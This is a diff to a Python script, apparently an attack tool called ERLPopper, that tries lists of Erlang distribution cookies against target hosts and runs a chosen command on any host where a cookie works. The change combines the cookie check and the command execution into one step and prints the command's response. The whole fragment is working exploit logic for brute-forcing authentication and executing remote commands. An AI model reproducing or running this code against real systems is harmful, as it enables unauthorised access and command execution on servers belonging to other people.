@@ -44,13 +44,11 @@ def main():
     if args.new:
         version = 6
 
-    good_hosts = []
     for target in args.target:
+        epop = ERLPopper(target=target, cookie=None, version=version, verbose=args.verbose, challenge=args.challenge, cmd=args.cmd)
         for cookie in args.cookie:
-            epop = ERLPopper(target=target, cookie=cookie, version=version, verbose=args.verbose, challenge=args.challenge, cmd=args.cmd)
-
             try:
-                res = epop.check_cookie()
+                res = epop.check_cookie_send_cmd(cookie, args.cmd)
             except ERLPopper.StatusError as e:
                 print(f"[E] Error status: '{repr(e.status)}', msg: '{e.message}'")
             except ERLPopper.EmptyResponseError as e:
@@ -60,21 +58,11 @@ def main():
             else:
                 if res:
                     h = {'target': target, 'cookie': cookie}
-                    good_hosts.append(h)
                     print(f"[+] Good cookie! Host: {target} Cookie: {cookie}")
+                    print(f"[+]   Response: '{repr(res)}'")
                     break
                 else:
                     if args.verbose: print("[-] Bad cookie!")
-
-    for h in good_hosts:
-        target = h['target']
-        cookie = h['cookie']
-
-        epop = ERLPopper(target=target, cookie=cookie, version=version, verbose=args.verbose, challenge=args.challenge, cmd=args.cmd)
-
-        res = epop.send_cmd(args.cmd)
-
-        print(f"[+] Command result ({target}): {repr(res)}")
 
 if __name__ == "__main__":
     main()
